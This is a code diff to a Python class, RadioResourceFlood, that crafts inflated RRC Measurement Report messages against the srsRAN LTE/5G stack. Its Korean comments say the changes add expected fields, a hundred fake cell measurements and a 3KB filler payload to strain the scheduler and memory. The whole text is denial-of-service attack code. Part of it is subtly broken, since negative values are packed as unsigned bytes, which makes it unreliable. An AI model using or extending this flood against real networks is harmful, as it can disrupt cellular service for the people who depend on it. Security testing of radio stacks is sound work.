@@ -158,12 +158,21 @@ class RadioResourceFlood:
         message = struct.pack('>H', 0x0005)  # Message Type: RRC Measurement Report
         message += struct.pack('>I', ue_id)  # UE Identity
         
+        # srsRAN이 기대하는 실제 RRC 필드들
+        message += struct.pack('>I', 0x12345678)  # RRC Transaction ID
+        message += struct.pack('>H', 0x0000)       # Criticality
+        message += struct.pack('>H', 0x0000)       # Spare
+        
         # 다수의 측정값 포함 (스케줄링 알고리즘 부담 증가)
-        for i in range(20):  # 20개 셀 측정값
+        for i in range(100):  # 100개 셀 측정값 (증가)
             message += struct.pack('>H', random.randint(1, 65535))  # Cell ID
             message += struct.pack('>B', random.randint(-120, -50))  # RSRP
             message += struct.pack('>B', random.randint(-20, 0))   # RSRQ
             message += struct.pack('>B', random.randint(0, 100))   # SINR
+        
+        # 더 큰 페이로드 추가 (메모리 사용량 증가)
+        large_payload = b'Y' * 3000  # 3KB 페이로드
+        message += large_payload
         
         return message
     
